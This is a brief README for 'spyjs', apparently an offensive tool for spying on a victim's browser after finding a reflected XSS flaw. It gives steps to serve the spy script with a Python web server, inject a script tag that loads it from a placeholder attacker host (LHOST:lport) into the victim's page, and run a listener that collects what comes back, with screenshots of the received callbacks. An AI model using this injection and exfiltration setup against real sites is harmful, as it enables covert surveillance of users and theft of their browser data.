# spyjs
Simple js sample to spy on browser, when reflacted xss found


Start server to serve js
```bash
python3 -m http.server 8080
```

Do on victim
```js
 <script src="http://LHOST:lport/spy.js"></script>
```

start listener
```bash
python3 listen.py 
```

# when triggered

![Screenshot](/imgs/callbk.png)

![Screenshot](/imgs/recv.png)




